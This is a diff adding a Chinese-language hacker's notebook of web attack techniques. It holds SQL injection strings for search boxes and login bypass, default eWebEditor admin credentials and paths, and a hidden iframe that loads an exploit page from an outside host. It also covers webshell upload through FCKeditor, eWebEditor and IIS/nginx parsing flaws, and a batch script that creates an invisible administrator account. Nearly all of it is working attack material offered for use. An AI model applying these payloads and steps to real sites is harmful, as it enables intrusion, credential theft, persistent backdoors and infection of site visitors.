@@ -1,0 +1,93 @@
+                    将平时所学到的漏洞记录...
+
+====================================================================
+寻找密码： conn.asp db.asp inc.asp 
+=====================================================================
+（搜索框注入漏洞）
+%' and 1=2 union select 1,admin,3,4,5,6,password,8,9,10 from admin where '%'='         方法：将语句输入到搜索框内
+======================================================================
+ewebeditor漏洞的利用
+后台：admin/ewebeditor/admin_login.asp
+数据库：admin/ewebeditor/db/ewebeditor.mdb
+默认帐号密码：admin      yzwcf606253  或 账号密码：cys158
+
+http://地址/ewebeditor/ewebeditor.asp?id=样式id&style=样式名称
+==============================================================
+新的万能密码
+帐号：' UNION SELECT 1,1,1 FROM admin WHERE ''='
+密码：1
+=============================================================
+框架挂马
+
+<iframe src=http://www.ktehack.cn/Ms07004.html width=0 height=0></iframe> 
+========================================================================
+HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\WindowsNT\CurrentVersion\Winlogon\SpecialAccounts\UserList
+=======================================================================
+留言本写入一句话，连接http://yoursite.com/databases/databases.asp
+======================================================================
+FCK编辑器绕过“.”转化为“_”的方法。
+
+绕过地址：FCKeditor/editor/filemanager/connectors/asp/connector.asp?Command=CreateFolder&Type=Image&CurrentFolder=%2Fshell.asp&NewFolderName=z&uuid=1244789975684  会创建一个shell的目录
+====================================================================
+用作欺骗上传
+<input name="FileName" type="FILE" class="tx1" size="20">
+====================================================================
+发布日期：2010-09.01
+发布作者：only_guest
+影响版本：微软系列
+官方地址：www.microsft.com
+漏洞类型：设计错误
+漏洞描述：可以通过特殊字符建立隐藏账户.命令行界面下不显示,用户管理面板中显示为空.非$..
+
+详细说明：可以通过智能ABC输入法中V9里的空白字符建立隐藏帐号,命令行下无法建立,可以先写个批处理,如下:
+net user  123 /add
+net localgroup administrators  /add
+注意其中的空白字符.非空格.
+建立后命令行下用net user命令查看账户显示为空白,在用户界面中同样显示空白.
+建立此帐号后无法在mstsc中直接输入登陆,需要在远程桌面的选项面板的常规选项卡中的用户名一栏里用智能ABC的V9输入特殊字符后再次连接.
+
+
+漏洞证明：新建一个批处理,内容如下.
+net user  123 /add
+net localgroup administrators  /add
+执行后查看用户管理界面,看看是否有个空白帐号.
+修复方案：过滤这些特殊字符吧.
+=====================================================================
+inurl:Showservices.asp?id=
+ 
+先访问
+ 
+http://网站/admin/xyeWebEditor/asp/upload.asp?action=save&type=image&style=popup&cusdir=1.asp
+ 
+产生一个1.asp目录
+ 
+利用IIS6.0解析漏洞
+
+利用下面的表单提交
+
+<form action="http://网站/admin/xyeWebEditor/asp/upload.asp?action=save&type=image&style=popup&cusdir=1.asp"
+ 
+method=post name=myform enctype="multipart/form-data">
+<input type=file name=uploadfile size=100><br><br>
+<input type=submit value=upload>
+</form>
+然后查看源文件，找出马儿路径
+======================================================================
+图片马
+IIS7.0网站漏洞利用及修复
+
+以目前流行的PHP为例：
+
+找个nginx的站,先注册一个用户然后在论坛上传一张我们刚刚合并的图片一句话马。
+找到图片地址,然后在地址后面加个xx.php，在浏览器中运行。
+比如假设图片地址为www.meckun.cn/upload/1.jpg
+则执行地址为www.meckun.cn/upload/1.jpg/xx.php
+然后,会在目录下生成xx.php。比如:www.meckun.cn/upload/x.php
+x.php就是我们的一句话地址。再拿一句话的客户端连接这个一句话地址就好。
+
+
+找到某个使用IIS7.0架设的站，然后找到其中的图片上传点（不需要管理权限，普通注册用户即可搞定），把PHP大马后缀改成.jpg，传上去，得到图片地址。
+
+在图片格式后面添加xx.php 
+注：xx随便你怎么填。只要后缀为.php就好
+===============================================================================
